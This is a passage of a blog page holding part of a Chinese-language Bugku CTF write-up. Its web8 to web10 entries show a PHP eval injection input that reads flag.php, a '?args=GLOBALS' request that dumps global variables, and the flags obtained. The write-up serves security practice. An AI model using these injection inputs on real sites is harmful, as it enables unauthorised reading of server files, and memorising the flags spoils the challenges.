+<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>說明:題目的意思是，先帶入’flag.php’，然後REQUEST一個參數hello(REQUEST是指不管是GET還是POST都讀進來)，eval是將()內的值當成cmd來執行，有點像execute()的感覺，裡面的var_dump()可以印出多個變數。<br>那該怎麼拿flag呢?<br>就是讓hello讀入’flag.php’，在url後面加上”?hello&#x3D;file(‘flag.php’)”，eval會幫你印出hello，也就是’flag.php’。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/NIGV4pe.png"
+                     
+                ></p>
+<p>flag:flag{d7d11dafb8d8c70e31bb2b815766cdeb}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>說明:題目<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/Uwn0KzH.png"
+                     
+                ><br>一開始說flag在變數中，然後檢查是否存在’args’這個變數，preg_match是檢查字串的函式。<br>解題方法就是將args宣告全域變數’GLOBALS’，這樣就能通過第一個判斷式進而拿到flag&#x3D;&gt;以GET方法發送?&#x2F;args&#x3D;GLOBALS。<br>會發現網頁噴出:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">array(7) </span><br><span class="line">&#123; </span><br><span class="line">	[&quot;_GET&quot;]=&gt; array(1) </span><br><span class="line">&#123; </span><br><span class="line">	[&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; </span><br><span class="line">	[&quot;_POST&quot;]=&gt; array(0) &#123; &#125; </span><br><span class="line">	[&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; </span><br><span class="line">	[&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; </span><br><span class="line">	[&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag&#123;6cac5d8119a66e846071f432ccac4760&#125;&quot; </span><br><span class="line">	[&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; </span><br><span class="line">	[&quot;GLOBALS&quot;]=&gt; *RECURSION* </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>flag:flag{6cac5d8119a66e846071f432ccac4760}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>說明:打開頁面會發現上面寫”什么也没有。”，看一下源代碼，也確實沒東西，抓封包的時候就發現有一個叫做”114.67.246.176”的封包裡面有一個flag的description，即flag。</p>
+<p>flag:flag{a5a9bebd73078491a903b22bebd1a5fb}</p>
+<p>solve date : 2021&#x2F;01&#x2F;13</p>
+<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><!-- CSS -->
+<style>
+    .navbar-brand:before {
+        content: 'Magic_Chihua × ' !important;
+        padding-left: 2em;
+        background-image: url(https://i.imgur.com/BWXp8py.png);
+        background-repeat: no-repeat;
+        background-size: contain;
+    }
+    .navbar-brand > .fa-file-text {
+        display: none;
+    }
+    .red{
+        color:#F00;
+        font-weight: bold;
+    }
+</style>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Bugku</li>
+        <li><strong>Author:</strong> Troy</li>
+        <li><strong>Created at
+                :</strong> 2024-12-25 01:44:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-12-25 01:44:51
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://tr0y2ooo.github.io/2024/12/25/Bugku/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Bugku/">#Bugku</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/12/25/OSCP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">OSCP</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/12/25/pico/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">pico</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Bugku</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bugku-CTF-Write-up"><span class="nav-text">Bugku CTF Write up</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn2"><span class="nav-text">pwn2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn3"><span class="nav-text">pwn3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">&#x2F;.-</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-text">[+ -&lt;&gt;]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%AA%E6%98%8E%E7%9A%84%E5%B0%8F%E7%BE%8A"><span class="nav-text">聪明的小羊</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ok"><span class="nav-text">ok</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-crypto"><span class="nav-text">easy_crypto</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REVERSE"><span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A5%E9%97%A8%E9%80%86%E5%90%91"><span class="nav-text">入门逆向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-2"><span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B0%BD%E5%88%B0%E9%A1%8C"><span class="nav-text">簽到題</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E4%B8%80%E5%BC%A0%E5%8D%95%E7%BA%AF%E7%9A%84%E5%9B%BE%E7%89%87"><span class="nav-text">这是一张单纯的图片</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C"><span class="nav-text">猜</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%BC%E8%A7%81%E9%9D%9E%E5%AE%9E"><span class="nav-text">眼见非实</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#talent"><span class="nav-text">talent</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1"><span class="nav-text">web1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web2"><span class="nav-text">web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web3"><span class="nav-text">web3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web4"><span class="nav-text">web4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web5"><span class="nav-text">web5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web6"><span class="nav-text">web6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web7"><span class="nav-text">web7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web8"><span class="nav-text">web8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web9"><span class="nav-text">web9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web10"><span class="nav-text">web10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web11"><span class="nav-text">web11</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Tr0y2ooo</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        21 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
